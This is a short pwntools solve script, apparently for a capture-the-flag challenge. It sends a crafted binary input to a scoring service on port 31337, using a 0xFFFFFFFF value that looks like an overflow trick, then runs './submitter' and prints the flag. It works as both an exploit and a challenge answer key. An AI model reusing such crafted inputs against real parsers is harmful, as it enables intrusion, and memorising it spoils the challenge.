import struct

from pwn import *


HOST = os.environ.get("HOST", "localhost")
PORT = 31337

r = remote(HOST, int(PORT))

r.recvuntil(b"\n")

# header
buf = struct.pack("<IHI", 0x73483074, 1, 0x11111111)
row_offset = 0

# hit 1
buf += struct.pack("<B", 1) + bytearray([0xFF]) * 7 + struct.pack("<h", 0x00)
row_offset += 1

# hit 2
hit_2 = bytearray(b"\x04" b"fUzZ" + b"\x00" + b"tHiS")
hit_2 = bytearray([c + row_offset for c in hit_2])
buf += hit_2
row_offset += 1

# hit 3
hit_3 = bytearray(b"\x10" b"\x55\x55\x55\x55\x55\x55\x55" + b"\x00\x00")
hit_3 = bytearray([c + row_offset for c in hit_3])
buf += hit_3
row_offset += 1

# hit 4
do_optimal = True
if do_optimal:
    # Optimal: 4x mult
    hit_4 = bytearray(b"\x40" + b"\x00\x00" + b"\x00" + b"991337")
else:
    # Sub-optimal: 2x mult
    hit_4 = bytearray(b"\x40" + b"\x00\x00" + b"\x00" + b"133799")

hit_4 = bytearray([c + row_offset for c in hit_4])
buf += hit_4
row_offset += 1

# hit 5
p = 0xFFFFFFFF
q = 1
hit_5 = bytearray(b"\x80" + struct.pack("<I", p) + struct.pack("<I", q) + b"\x00")
hit_5 = bytearray([(c + row_offset) % 256 for c in hit_5])
buf += hit_5
row_offset += 1

i = 0
while len(buf) < 1000:
    buf += struct.pack("<B", 0)
    buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    i += 1


r.send(buf)

# r.interactive()
output = r.recvuntil(b"Final score:", timeout=5)

# r.interactive()
# print(output.decode())
# rest = r.recvall(2)
# print(rest.decode())
sleep(2)
r.sendline(b"./submitter")
print(r.recvline_contains(b"Flag:"))
